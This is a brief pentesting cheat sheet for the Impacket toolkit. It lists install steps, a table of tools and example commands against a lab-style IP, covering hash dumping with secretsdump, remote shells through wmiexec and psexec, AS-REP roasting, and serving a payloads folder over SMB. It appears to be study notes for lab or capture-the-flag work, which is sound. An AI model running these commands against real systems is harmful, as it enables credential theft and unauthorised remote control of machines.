# impacket
```
Source: https://github.com/fortra/impacket
Description: 

Note: Samba share is a network file share that uses SMB (Server Message Block) protocol to allow file and folder sharing between computers(Linux/Unix and Windows systems)

pip3 install impacket                               git clone https://github.com/fortra/impacket.git
                                                    cd impacket
                                                    pip3 install .

Impacket comes with many CLI tools. Most are in /usr/bin or the examples/ folder if you cloned it.
Tool	                Purpose
smbserver.py	        Serve a folder as an SMB share
secretsdump.py	        Dump password hashes from a target
wmiexec.py	            Remote command execution via WMI
psexec.py	            Remote code execution (like PsExec)
smbclient.py	        SMB client (like Windows net use)
mssqlclient.py	        Connect to MS SQL Server
ntlmrelayx.py	        NTLM relay attacks
rpcdump.py	            Dump RPC endpoints
GetNPUsers.py	        Kerberos AS-REP roasting

# Serve a folder over SMB
smbserver.py shareName /path/to/folder
smbserver.py share /home/kali/payloads

# Dump NTLM hashes from Windows machine
secretsdump.py Administrator:'Password123!'@10.10.10.125

# Remote command execution via WMI
wmiexec.py user:pass@10.10.10.125

# Gain a shell with psexec
psexec.py user:pass@10.10.10.125

# Dump users for AS-REP roasting (no login needed)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass

# Connect to MS SQL Server
mssqlclient.py sa@10.10.10.125
```

## Back to README.md
[BACK](../README.md)